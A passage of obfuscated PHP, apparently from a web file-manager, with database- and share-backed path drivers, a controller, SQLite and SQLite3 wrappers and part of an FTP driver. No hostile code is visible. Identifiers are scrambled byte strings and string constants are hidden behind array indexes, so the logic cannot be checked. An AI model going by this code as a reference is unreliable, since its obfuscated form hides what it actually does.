$ŸÁãİÈÀ[$ó¦‡Ôƒ›[214]], $ó¦‡Ôƒ›[213] => $ŸÁãİÈÀ[$ó¦‡Ôƒ›[213]]); } return $°†Œï¨Ø ? $ŸÁãİÈÀ[$ó¦‡Ôƒ›[214]] : $ŸÁãİÈÀ[$ó¦‡Ôƒ›[213]]; } public function listAll($Ø´€‘ÇÒ) { $¹Ü‹ÍÎ² = IO::info($this->pathParse[$_SERVER[Á÷ ­Šë][86]]); if (!$¹Ü‹ÍÎ²) { return array(); } return $this->model->listAll($Ø´€‘ÇÒ); } public function getContent($ö§ÏÍ˜) { return $this->model->getContent($ö§ÏÍ˜); } public function setContent($ùËÆåëÄ, $ÑÖÂÏ¸ = '') { return $this->model->setContent($ùËÆåëÄ, $ÑÖÂÏ¸); } public function fileSubstr($ä—×Áˆç, $˜üûÇÕ¤, $ñ°ÔúÆ) { return $this->model->fileSubstr($ä—×Áˆç, $˜üûÇÕ¤, $ñ°ÔúÆ); } public function download($òƒËêêµ, $şø«¾Õ“ = '') { $ÇäüÇõÔ = get_path_father($şø«¾Õ“); $í”½æ‘ = get_path_this($şø«¾Õ“); $š×µà÷ = $this->model->fileInfoGet($òƒËêêµ); $Óï’ªŞ = IO::copy($š×µà÷[$_SERVER[Á÷ ­Šë][86]], $ÇäüÇõÔ, !1, $í”½æ‘); return $Óï’ªŞ; } public function setModifyTime($™Éõµ‘—, $ÔòË¶Ğ“ = '') { $«×ÑöÎ« =& $_SERVER[Á÷ ­Šë]; if (!$™Éõµ‘—) { return; } $this->model->where(array($«×ÑöÎ«[422] => $™Éõµ‘—))->save(array($«×ÑöÎ«[94] => $ÔòË¶Ğ“)); } public function upload($³Ïå°æƒ, $«İÛ¹¨, $º²˜üÍ‹ = false, $ª¤ñó·Õ = REPEAT_REPLACE) { $½‚Ëœª =& $_SERVER[Á÷ ­Šë]; $‡ŠìÆ¥ = $this->parse($³Ïå°æƒ); $–Å‹Å“ö = $this->model->addFile($‡ŠìÆ¥[$½‚Ëœª[404]], $«İÛ¹¨, $‡ŠìÆ¥[$½‚Ëœª[86]], $º²˜üÍ‹, $ª¤ñó·Õ); return $this->getPathOuter($–Å‹Å“ö); } public function uploadFileByID($éÂ‡°¯ì, $ÈêÕÊğ, $®¢Ù’€¹) { $…Û•¾İÈ =& $_SERVER[Á÷ ­Šë]; $½¡ëÇè† = $this->parse($éÂ‡°¯ì); $Šé„Êó’ = $this->model->addFileByFileID($½¡ëÇè†[$…Û•¾İÈ[404]], $ÈêÕÊğ, $½¡ëÇè†[$…Û•¾İÈ[86]], $®¢Ù’€¹); return $this->getPathOuter($Šé„Êó’); } public function addFileByRemote($øÙã··Æ, $Õßá—Âä, $¼Œ»ôÅÉ = array(), $Ÿ¬‘çÙÈ = '', $ÂİÜÁæ) { $­Ô¿€¡ =& $_SERVER[Á÷ ­Šë]; $ƒç´ã•Æ = $this->parse($øÙã··Æ); $Ÿ¬‘çÙÈ = empty($Ÿ¬‘çÙÈ) ? $ƒç´ã•Æ[$­Ô¿€¡[86]] : $Ÿ¬‘çÙÈ; $¼º³©€÷ = $this->model->addFileByRemote($ƒç´ã•Æ[$­Ô¿€¡[404]], $Õßá—Âä, $Ÿ¬‘çÙÈ, $¼Œ»ôÅÉ, $ÂİÜÁæ); return $this->getPathOuter($¼º³©€÷); } public function uploadLink($‘óËğÊí, $ÀØÌ¶îÃ = 0) { $ğ¼ïÖ =& $_SERVER[Á÷ ­Šë]; $”İÑÇ¹Á = $this->parse($‘óËğÊí); $÷µÅ× â = _get($GLOBALS[$ğ¼ïÖ[7]], $ğ¼ïÖ[1251]); $Ó–çÒâ¡ = _get($GLOBALS[$ğ¼ïÖ[7]], $ğ¼ïÖ[1252]); $‘óËğÊí = Model($ğ¼ïÖ[607])->createFileName($”İÑÇ¹Á[$ğ¼ïÖ[86]], $÷µÅ× â, $Ó–çÒâ¡); return IO::uploadLink($‘óËğÊí, $ÀØÌ¶îÃ); } public function fileNameAuto($ÕË´õî, $ïöàÎ˜á, $½È–İ¢Ê = REPEAT_REPLACE, $½Şã™‘Ö = false) { return $this->model->fileNameAuto($ÕË´õî, $ïöàÎ˜á, $½È–İ¢Ê, $½Şã™‘Ö); } public function fileNameExist($Éî‘º¾Ù, $À ıä·½) { return $this->model->fileNameExist($Éî‘º¾Ù, $À ıä·½); } protected function _fileOut($šˆÒÆË, $¥ëœ•§Ü = false, $ÁÕª» í = false, $¢Èàû¬† = '', $Æ†êŒîİ = false) { $şÏ‡½ =& $_SERVER[Á÷ ­Šë]; $ÒÍ©Îü… = $this->model->sourceInfo($šˆÒÆË); if ($ÒÍ©Îü…[$şÏ‡½[415]] == $şÏ‡½[97]) { header($şÏ‡½[1253]); die; } $Å–µÕò = $this->model->fileInfoGet($šˆÒÆË); $¢Èàû¬† = $Å–µÕò[$şÏ‡½[180]] ? $Å–µÕò[$şÏ‡½[180]] : $¢Èàû¬†; $Æ‡éßİæ = isset($GLOBALS[$şÏ‡½[1254]]) ? $GLOBALS[$şÏ‡½[1254]] : $ÒÍ©Îü…[$şÏ‡½[28]]; if ($Æ†êŒîİ) { return IO::fileOutServer($Å–µÕò[$şÏ‡½[86]], $¥ëœ•§Ü, $Æ‡éßİæ, $¢Èàû¬†); } IO::fileOut($Å–µÕò[$şÏ‡½[86]], $¥ëœ•§Ü, $Æ‡éßİæ, $¢Èàû¬†); } public function fileOut($ä©‚ºŠê, $ıö˜à¦ï = false, $â‡®©Ô = false, $òÔë§ª = '') { $this->_fileOut($ä©‚ºŠê, $ıö˜à¦ï, $â‡®©Ô, $òÔë§ª); } public function fileOutServer($ö–Û€æ¹, $ÚÙ¨Àì = false, $ÎÒÁîÀˆ = false, $öøìÄÌ‹ = '') { $this->_fileOut($ö–Û€æ¹, $ÚÙ¨Àì, $ÎÒÁîÀˆ, $öøìÄÌ‹, !0); } protected function _fileOutImage($¶‘—µºà, $àˆòèğõ = 250) { $»¸”„Š¬ =& $_SERVER[Á÷ ­Šë]; $ÔĞ÷ Œ = $this->model->pathInfo($¶‘—µºà); if ($ÔĞ÷ Œ[$»¸”„Š¬[415]] == $»¸”„Š¬[97]) { show_json($»¸”„Š¬[1255] . $¶‘—µºà, !1); } $òØßèğÅ = $this->model->fileInfoGet($¶‘—µºà); $òØßèğÅ[$»¸”„Š¬[28]] = $ÔĞ÷ Œ[$»¸”„Š¬[28]]; $òØßèğÅ[$»¸”„Š¬[173]] = $ÔĞ÷ Œ[$»¸”„Š¬[173]]; $GLOBALS[$»¸”„Š¬[1254]] = $òØßèğÅ[$»¸”„Š¬[28]]; $GLOBALS[$»¸”„Š¬[172]] = $òØßèğÅ; IO::fileOutImage($òØßèğÅ[$»¸”„Š¬[86]], $àˆòèğõ); } public function fileOutImage($œĞ¹Èİğ, $ëı¹­û€ = 250) { $this->_fileOutImage($œĞ¹Èİğ, $ëı¹­û€); } public function fileOutImageServer($çÓ–ëÕê, $Íç±¶¦ = 250) { $this->_fileOutImage($çÓ–ëÕê, $Íç±¶¦); } public function link($†øµÒÁ€, $“²×Ì€„ = '') { $ı™Û‹›á = $this->model->fileInfoGet($†øµÒÁ€); return IO::link($ı™Û‹›á[$_SERVER[Á÷ ­Šë][86]], $“²×Ì€„); } protected function parse($º–¥î¸á) { $ĞÍöÇ‚ =& $_SERVER[Á÷ ­Šë]; if (strstr($º–¥î¸á, $ĞÍöÇ‚[8]) === !1) { return array($ĞÍöÇ‚[424] => intval($º–¥î¸á), $ĞÍöÇ‚[86] => $ĞÍöÇ‚[33], $ĞÍöÇ‚[1250] => array()); } $Ùù«†»° = explode($ĞÍöÇ‚[8], trim($º–¥î¸á, $ĞÍöÇ‚[8])); if (count($Ùù«†»°) < 2) { show_tips(clear_html($º–¥î¸á) . $ĞÍöÇ‚[1256]); } return array($ĞÍöÇ‚[424] => intval($Ùù«†»°[0]), $ĞÍöÇ‚[86] => $Ùù«†»°[1], $ĞÍöÇ‚[1250] => array_slice($Ùù«†»°, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($êûıâ²º) { $this->pathParse = $êûıâ²º; $this->model = Model($_SERVER[Á÷ ­Šë][1249]); } public function getPathOuter($ê›ˆ‚ÛÃ) { $ŸêÔ¦è =& $_SERVER[Á÷ ­Šë]; if (!$ê›ˆ‚ÛÃ) { return $ê›ˆ‚ÛÃ; } $ˆó´½ùú = $this->parse($ê›ˆ‚ÛÃ); return trim(KodIO::makeShare($this->pathParse[$ŸêÔ¦è[404]], $ˆó´½ùú[$ŸêÔ¦è[404]]), $ŸêÔ¦è[8]); } protected function infoParse($Ëì–æµµ, $û½œŸ“ = false, $Ş ğ×ü— = false) { $Û¸†ÍÙû =& $_SERVER[Á÷ ­Šë]; $ÃÍ³Ö­± = $this->pathParse[$Û¸†ÍÙû[404]]; $ìËíø¥ = trim($this->pathParse[$Û¸†ÍÙû[1095]], $Û¸†ÍÙû[8]); return Action($Û¸†ÍÙû[1257])->sharePathInfo($ÃÍ³Ö­±, $ìËíø¥); } public function infoFull($·¢ìÁ Í) { $°ÜËßşË =& $_SERVER[Á÷ ­Šë]; $ú„±ç¬ø = explode($°ÜËßşË[8], trim($·¢ìÁ Í, $°ÜËßşË[8])); if (count($ú„±ç¬ø) > 1) { $½ ¬¤ù = implode($°ÜËßşË[8], array_splice($ú„±ç¬ø, 1)); $ĞşØç¯é = $this->model->pathInfoByPath($ú„±ç¬ø[0], $½ ¬¤ù); if (!$ĞşØç¯é) { return !1; } $this->pathParse[$°ÜËßşË[1095]] = $ĞşØç¯é[$°ÜËßşË[407]]; } return $this->infoParse($·¢ìÁ Í); } public function listAll($‡Ôçœ«½) { $¹¤ğƒ¯® =& $_SERVER[Á÷ ­Šë]; $³ı‹¤·Å = IO::info($this->pathParse[$¹¤ğƒ¯®[86]]); if (!$³ı‹¤·Å) { return array(); } $•©ŸŸîÄ = $this->model->listAll($‡Ôçœ«½); $˜ŒÔäğ¨ = Model($¹¤ğƒ¯®[599])->getInfo($³ı‹¤·Å[$¹¤ğƒ¯®[492]]); $¯Š€“éÇ = Action($¹¤ğƒ¯®[1257]); foreach ($•©ŸŸîÄ as &$’Ëüí) { check_abort(); $’Ëüí[$¹¤ğƒ¯®[95]] = $¯Š€“éÇ->_shareItemeParse($’Ëüí[$¹¤ğƒ¯®[95]], $˜ŒÔäğ¨); } unset($’Ëüí); return $•©ŸŸîÄ; } } goto a««‡±‹×à; cæ³Õî‚‡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $äÃáÆåª =& $_SERVER[Á÷ ­Šë]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$äÃáÆåª[6]] =& $config; $this->values[$äÃáÆåª[7]] =& $in; $this->tpl = TEMPLATE . MOD . $äÃáÆåª[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($”¢•«ì‡) { if (1 === func_num_args()) { $this->{$”¢•«ì‡} = new $”¢•«ì‡(); } else { $¢Œè•Ôè = new ReflectionClass($”¢•«ì‡); $µ—êŒØ = func_get_args(); array_shift($µ—êŒØ); $this->{$”¢•«ì‡} = $¢Œè•Ôè->newInstanceArgs($µ—êŒØ); } return $this->{$”¢•«ì‡}; } protected function assign($Ÿö†œú¼, $µ²‰ÀÈ¡) { $this->values[$Ÿö†œú¼] = $µ²‰ÀÈ¡; } protected function display($¤Íºß‰) { ob_end_clean(); extract($this->values); require $this->tpl . $¤Íºß‰; } } class DbSqliteBase extends Db { public function __construct($ÒıÃğ¢¨ = '') { $ Ï‚ Ù– =& $_SERVER[Á÷ ­Šë]; if (!extension_loaded($ Ï‚ Ù–[9])) { think_exception(think_lang($ Ï‚ Ù–[10]) . $ Ï‚ Ù–[11]); } if (!empty($ÒıÃğ¢¨)) { if (!isset($ÒıÃğ¢¨[$ Ï‚ Ù–[12]])) { $ÒıÃğ¢¨[$ Ï‚ Ù–[12]] = 438; } $this->config = $ÒıÃğ¢¨; if (empty($this->config[$ Ï‚ Ù–[13]])) { $this->config[$ Ï‚ Ù–[13]] = array(); } } } public function connect($¬Ë¼×”’ = '', $‹³•Ôëœ = 0) { $Ê¢˜¦õ» =& $_SERVER[Á÷ ­Šë]; if (!isset($this->linkID[$‹³•Ôëœ])) { if (empty($¬Ë¼×”’)) { $¬Ë¼×”’ = $this->config; } $ÖÀœÇÈ— = !empty($¬Ë¼×”’[$Ê¢˜¦õ»[13]][$Ê¢˜¦õ»[14]]) ? $¬Ë¼×”’[$Ê¢˜¦õ»[13]][$Ê¢˜¦õ»[14]] : $this->pconnect; $ÆÈ¡¤” = $ÖÀœÇÈ— ? $Ê¢˜¦õ»[15] : $Ê¢˜¦õ»[16]; $this->linkID[$‹³•Ôëœ] = $ÆÈ¡¤”($¬Ë¼×”’[$Ê¢˜¦õ»[17]], $¬Ë¼×”’[$Ê¢˜¦õ»[12]]); if (!$this->linkID[$‹³•Ôëœ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$‹³•Ôëœ], 30000); if (1 != think_config($Ê¢˜¦õ»[18])) { unset($this->config); } } return $this->linkID[$‹³•Ôëœ]; } public function free() { $this->queryID = null; } public function query($–ñ×ª›) { $øé¸ˆÙé =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $–ñ×ª›; if ($this->queryID) { $this->free(); } think_action_status($øé¸ˆÙé[19], 1); think_status($øé¸ˆÙé[20]); $this->queryID = sqlite_query($this->_linkID, $–ñ×ª›); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ãê½¤ù† = $this->getAll(); return $Ãê½¤ù†; } } public function execute($é€¹ËËç) { $¬ôïàÈ‘ =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $é€¹ËËç; if ($this->queryID) { $this->free(); } think_action_status($¬ôïàÈ‘[21], 1); think_status($¬ôïàÈ‘[20]); $îÇ±¦š = sqlite_exec($this->_linkID, $é€¹ËËç); $this->debug(); if (!1 === $îÇ±¦š) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[Á÷ ­Šë][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ğĞ€àœ¢ = sqlite_query($this->_linkID, $_SERVER[Á÷ ­Šë][23]); if (!$ğĞ€àœ¢) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $üÌÏüÊ = sqlite_query($this->_linkID, $_SERVER[Á÷ ­Šë][24]); if (!$üÌÏüÊ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ë‘î¼åŸ = array(); if ($this->numRows > 0) { for ($Í¤˜à²¤ = 0; $Í¤˜à²¤ < $this->numRows; $Í¤˜à²¤++) { $ë‘î¼åŸ[$Í¤˜à²¤] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ë‘î¼åŸ; } public function getFields($†Äù€¢“) { $”¢Ìš°º =& $_SERVER[Á÷ ­Šë]; $÷ïÙøĞå = $this->query($”¢Ìš°º[25] . $†Äù€¢“ . $”¢Ìš°º[26]); $‰Â¤Ì¢ß = array(); if ($÷ïÙøĞå) { foreach ($÷ïÙøĞå as $„ğ°âØæ => $ÏÁ€ÒÇ§) { $‰Â¤Ì¢ß[$ÏÁ€ÒÇ§[$”¢Ìš°º[27]]] = array($”¢Ìš°º[28] => $ÏÁ€ÒÇ§[$”¢Ìš°º[27]], $”¢Ìš°º[29] => $ÏÁ€ÒÇ§[$”¢Ìš°º[30]], $”¢Ìš°º[31] => (bool) ($ÏÁ€ÒÇ§[$”¢Ìš°º[32]] === $”¢Ìš°º[33]), $”¢Ìš°º[34] => $ÏÁ€ÒÇ§[$”¢Ìš°º[35]], $”¢Ìš°º[36] => strtolower($ÏÁ€ÒÇ§[$”¢Ìš°º[37]]) == $”¢Ìš°º[38], $”¢Ìš°º[39] => strtolower($ÏÁ€ÒÇ§[$”¢Ìš°º[40]]) == $”¢Ìš°º[41]); } } return $‰Â¤Ì¢ß; } public function getTables($äÄÂ ²« = '') { $º»Ø× œ =& $_SERVER[Á÷ ­Šë]; $ÒñãûÉ = $this->query($º»Ø× œ[42] . $º»Ø× œ[43] . $º»Ø× œ[44]); $ÙÛŠá´ = array(); foreach ($ÒñãûÉ as $òÀ°¹… => $¢²ÚÖÚ) { $ÙÛŠá´[$òÀ°¹…] = current($¢²ÚÖÚ); } return $ÙÛŠá´; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $‚«‡–í =& $_SERVER[Á÷ ­Šë]; $±¢ †ì = sqlite_last_error($this->_linkID); $this->error = $±¢ †ì . $‚«‡–í[4] . sqlite_error_string($±¢ †ì); if ($‚«‡–í[33] != $this->queryStr) { $this->error .= LNG($‚«‡–í[45]) . $this->queryStr; } think_trace($this->error, $‚«‡–í[33], $‚«‡–í[46]); return $this->error; } public function escapeString($€êåå±) { return sqlite_escape_string($€êåå±); } public function parseLimit($½ü×Êß) { $¦¡ü€¨„ =& $_SERVER[Á÷ ­Šë]; $†Â£¢© = $¦¡ü€¨„[33]; if (!empty($½ü×Êß)) { $½ü×Êß = explode($¦¡ü€¨„[47], $½ü×Êß); if (count($½ü×Êß) > 1) { $†Â£¢© .= $¦¡ü€¨„[48] . $½ü×Êß[1] . $¦¡ü€¨„[49] . $½ü×Êß[0] . $¦¡ü€¨„[50]; } else { $†Â£¢© .= $¦¡ü€¨„[48] . $½ü×Êß[0] . $¦¡ü€¨„[50]; } } return $†Â£¢©; } } class DbSqlite3Base extends Db { public function __construct($ü±¼¡ç÷ = '') { $ŠåÅŞø =& $_SERVER[Á÷ ­Šë]; if (!class_exists($ŠåÅŞø[51])) { think_exception(think_lang($ŠåÅŞø[10]) . $ŠåÅŞø[52]); } if (!empty($ü±¼¡ç÷)) { if (!isset($ü±¼¡ç÷[$ŠåÅŞø[12]])) { $ü±¼¡ç÷[$ŠåÅŞø[12]] = 438; } $this->config = $ü±¼¡ç÷; if (empty($this->config[$ŠåÅŞø[13]])) { $this->config[$ŠåÅŞø[13]] = array(); } } } public function connect($Óú§Ş° = '', $«œ¤‚Šš = 0) { $ŸØşÌÄ™ =& $_SERVER[Á÷ ­Šë]; if (!isset($this->linkID[$«œ¤‚Šš])) { if (empty($Óú§Ş°)) { $Óú§Ş° = $this->config; } $this->linkID[$«œ¤‚Šš] = new SQLite3($Óú§Ş°[$ŸØşÌÄ™[17]]); if (!$this->linkID[$«œ¤‚Šš]) { think_exception($this->linkID[$«œ¤‚Šš]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$«œ¤‚Šš]->busyTimeout(30000); if (1 != think_config($ŸØşÌÄ™[18])) { unset($this->config); } } return $this->linkID[$«œ¤‚Šš]; } public function free() { $this->queryID = null; } public function query($™Úî§çö) { $ºˆßå› =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $™Úî§çö; if ($this->queryID) { $this->free(); } think_action_status($ºˆßå›[19], 1); think_status($ºˆßå›[20]); $this->queryID = $this->_linkID->query($™Úî§çö); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ø†©Ò÷ê = $this->getAll(); $this->numRows = count($Ø†©Ò÷ê); return $Ø†©Ò÷ê; } } public function execute($…öÔ¦ıæ) { $ÂÄùÌÄØ =& $_SERVER[Á÷ ­Šë]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…öÔ¦ıæ; if ($this->queryID) { $this->free(); } think_action_status($ÂÄùÌÄØ[21], 1); think_status($ÂÄùÌÄØ[20]); $ñ¸·¢ß = $this->_linkID->exec($…öÔ¦ıæ); $this->debug(); if (!1 === $ñ¸·¢ß) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Á÷ ­Šë][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $æäòé½¡ = $this->_linkID->query($_SERVER[Á÷ ­Šë][23]); if (!$æäòé½¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¯ÓĞØŸ = $this->_linkID->query($_SERVER[Á÷ ­Šë][24]); if (!$¯ÓĞØŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¬—¦úÎù = array(); while ($È¬öûˆÖ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¬—¦úÎù[] = $È¬öûˆÖ; } $this->queryID->reset(); return $¬—¦úÎù; } public function getFields($Á–èü¸‚) { $šŞë£Ü =& $_SERVER[Á÷ ­Šë]; $ÃûâĞä± = $this->query($šŞë£Ü[25] . $Á–èü¸‚ . $šŞë£Ü[26]); $¬†µÕ¤à = array(); if ($ÃûâĞä±) { foreach ($ÃûâĞä± as $¦Ñİà‚Ö => $§şÈú«“) { $¬†µÕ¤à[$§şÈú«“[$šŞë£Ü[28]]] = array($šŞë£Ü[28] => $§şÈú«“[$šŞë£Ü[28]], $šŞë£Ü[29] => $§şÈú«“[$šŞë£Ü[29]], $šŞë£Ü[31] => (bool) ($§şÈú«“[$šŞë£Ü[31]] === $šŞë£Ü[33]), $šŞë£Ü[34] => $§şÈú«“[$šŞë£Ü[53]], $šŞë£Ü[36] => (bool) $§şÈú«“[$šŞë£Ü[54]], $šŞë£Ü[39] => (bool) $§şÈú«“[$šŞë£Ü[54]]); } } return $¬†µÕ¤à; } public function getTables($Ñöì‰ŞÛ = '') { $ºáÇŒ« =& $_SERVER[Á÷ ­Šë]; $À»Ó‘¼ = $this->query($ºáÇŒ«[42] . $ºáÇŒ«[43] . $ºáÇŒ«[44]); $Çá›˜Î¢ = array(); foreach ($À»Ó‘¼ as $§Ğ»Ú° => $Ğ£É¾ş–) { $Çá›˜Î¢[$§Ğ»Ú°] = current($Ğ£É¾ş–); } return $Çá›˜Î¢; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $âÓù«„ =& $_SERVER[Á÷ ­Šë]; $this->error = $this->_linkID->lastErrorMsg(); if ($âÓù«„[33] != $this->queryStr) { $this->error .= LNG($âÓù«„[45]) . $this->queryStr; } think_trace($this->error, $âÓù«„[33], $âÓù«„[46]); return $this->error; } public function escapeString($È¢€¶º) { $ñ¹¨¾“ =& $_SERVER[Á÷ ­Šë]; if ($this->_linkID) { return $this->_linkID->escapeString($È¢€¶º); } return str_ireplace($ñ¹¨¾“[55], $ñ¹¨¾“[56], $È¢€¶º); } public function parseLimit($Ç³Ëğò«) { $Ùà’Éƒ¾ =& $_SERVER[Á÷ ­Šë]; $¥ˆÓ©ÊØ = $Ùà’Éƒ¾[33]; if (!empty($Ç³Ëğò«)) { $Ç³Ëğò« = explode($Ùà’Éƒ¾[47], $Ç³Ëğò«); if (count($Ç³Ëğò«) > 1) { $¥ˆÓ©ÊØ .= $Ùà’Éƒ¾[48] . $Ç³Ëğò«[1] . $Ùà’Éƒ¾[49] . $Ç³Ëğò«[0] . $Ùà’Éƒ¾[50]; } else { $¥ˆÓ©ÊØ .= $Ùà’Éƒ¾[48] . $Ç³Ëğò«[0] . $Ùà’Éƒ¾[50]; } } return $¥ˆÓ©ÊØ; } } goto EŸ¯ÍšÑÚÁ; Aö›ïª˜Œ÷: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($ĞùÈ‡ƒõ) { parent::__construct(); if (count($ĞùÈ‡ƒõ) > 0) { $this->_init($ĞùÈ‡ƒõ); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ óàóìÒ) { $§Ãô¢ß— =& $_SERVER[Á÷ ­Šë]; global $config; $this->appCharset = $config[$§Ãô¢ß—[1286]]; $this->systemCharset = $config[$§Ãô¢ß—[1287]]; if (isset($ óàóìÒ[$§Ãô¢ß—[1288]]) && $ óàóìÒ[$§Ãô¢ß—[1288]]) { $this->systemCharset = $ óàóìÒ[$§Ãô¢ß—[1288]]; } } public function iconvApp($çãğ£÷Œ) { return $this->iconvTo($çãğ£÷Œ, $this->systemCharset, $this->appCharset); } public function iconvSystem($›ç³²ç˜) { return $this->iconvTo($›ç³²ç˜, $this->appCharset, $this->systemCharset); } public function getPathOuter($…§´¤’û) { $òË¶ø´Ø =& $_SERVER[Á÷ ­Šë]; $–ƒäô£Á = $this->iconvApp($this->pathBase); $…§´¤’û = $this->iconvApp($…§´¤’û); if (substr($–ƒäô£Á, 0, 2) == $òË¶ø´Ø[1289]) { $–ƒäô£Á = BASIC_PATH . substr($–ƒäô£Á, 2); } if (substr($…§´¤’û, 0, 2) == $òË¶ø´Ø[1289]) { $…§´¤’û = BASIC_PATH . substr($…§´¤’û, 2); } $–ƒäô£Á = KodIO::clear($–ƒäô£Á); $…§´¤’û = KodIO::clear($…§´¤’û); $…§´¤’û = substr($…§´¤’û, strlen($–ƒäô£Á)); if (empty($this->pathDriver)) { return $…§´¤’û; } return $this->pathDriver . $òË¶ø´Ø[8] . ltrim($…§´¤’û, $òË¶ø´Ø[8]); } private function _init($Éß’ğáÊ = array()) { $Œ¶õÎÛ =& $_SERVER[Á÷ ­Šë]; if (!function_exists($Œ¶õÎÛ[1290])) { throw new Exception(LNG($Œ¶õÎÛ[1291])); } $this->config = $Éß’ğáÊ; $this->charsetReset($Éß’ğáÊ); foreach ($Éß’ğáÊ as $‹¨±²âÆ => $ßÌ¶î¹) { if (isset($this->{$‹¨±²âÆ})) { $this->{$‹¨±²âÆ} = $ßÌ¶î¹; } } return $this->_login($Éß’ğáÊ); } private function _login($Ú¹§Çè) { $ıúóªö¹ =& $_SERVER[Á÷ ­Šë]; static $æË³¡Í = array(); $“’™ê£Ø = md5(json_encode($Ú¹§Çè)); if (isset($æË³¡Í[$“’™ê£Ø])) { foreach ($æË³¡Í[$“’™ê£Ø] as $Àƒ¢çÇ => $¿è…ãÙÃ) { $this->{$Àƒ¢çÇ} = $¿è…ãÙÃ; } return !0; } $Š…ÂĞŒ« = parse_url(trim($this->server, $ıúóªö¹[8])); $this->host = $Š…ÂĞŒ«[$ıúóªö¹[185]]; $¸ĞÍóî = isset($Š…ÂĞŒ«[$ıúóªö¹[184]]) && $Š…ÂĞŒ«[$ıúóªö¹[184]] == $ıúóªö¹[1292] ? !0 : !1; $this->scheme = $¸ĞÍóî ? $ıúóªö¹[1293] : $ıúóªö¹[1294]; $this->port = isset($Š…ÂĞŒ«[$ıúóªö¹[186]]) ? $Š…ÂĞŒ«[$ıúóªö¹[186]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Îûüªê = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $ì¼ã”Ææ = $this->pasv == $ıúóªö¹[97] ? !0 : !1; @ftp_pasv($this->connect, $ì¼ã”Ææ); $æË³¡Í[$“’™ê£Ø] = array($ıúóªö¹[1295] => $this->connect, $ıúóªö¹[185] => $this->host, $ıúóªö¹[184] => $this->scheme, $ıúóªö¹[186] => $this->port); return $Îûüªê; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($šÀâªØ, $ò¥‘Ûµø = '', $½”ŒÃÍ = REPEAT_RENAME) { if ($this->setContent($šÀâªØ, $ò¥‘Ûµø)) { return $this->getPathOuter($šÀâªØ); } return !1; } public function mkdir($‚Ï®ÁÊ, $‘‡ÖÏ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $‚Ï®ÁÊ = $this->iconvSystem($‚Ï®ÁÊ); if ($this->_isFolder($‚Ï®ÁÊ) || @ftp_mkdir($this->connect, $‚Ï®ÁÊ)) { return $this->getPathOuter($‚Ï®ÁÊ); } if (!$this->mkdir($this->pathFather($‚Ï®ÁÊ))) { return !1; } if ($‚Ï®ÁÊ = @ftp_mkdir($this->connect, $‚Ï®ÁÊ)) { return $this->getPathOuter($‚Ï®ÁÊ); } return !1; } public function copyFile($¶’Üäªò, $áµ°ä€ó) { if (!$this->_isconn()) { return !1; } $¤–´–…Ö = $this->pathThis($this->iconvSystem($¶’Üäªò)); $äÔóÁ†§ = $this->tempFile($¤–´–…Ö); $Ç’®ÑÉì = $this->iconvApp($äÔóÁ†§); $this->download($¶’Üäªò, $Ç’®ÑÉì); $Ù­¾³¢´ = $this->upload($áµ°ä€ó, $Ç’®ÑÉì); $this->tempFileRemve($äÔóÁ†§); return $Ù­¾³¢´; } public function moveFile($Ê£ùƒ€Î, $¶ëÉÅ¡ê) { if (!$this->_isconn()) { return !1; } $Ê£ùƒ€Î = $this->iconvSystem($Ê£ùƒ€Î); $¶ëÉÅ¡ê = $this->iconvSystem($¶ëÉÅ¡ê); $›µâ†Ÿ“ = @ftp_rename($this->connect, $Ê£ùƒ€Î, $¶ëÉÅ¡ê); return $›µâ†Ÿ“ ? $this->getPathOuter($¶ëÉÅ¡ê) : !1; } public function delFile($ÏÎì©¾‚) { if (!$this->_isconn()) { return !1; } $ÏÎì©¾‚ = $this->iconvSystem($ÏÎì©¾‚); return 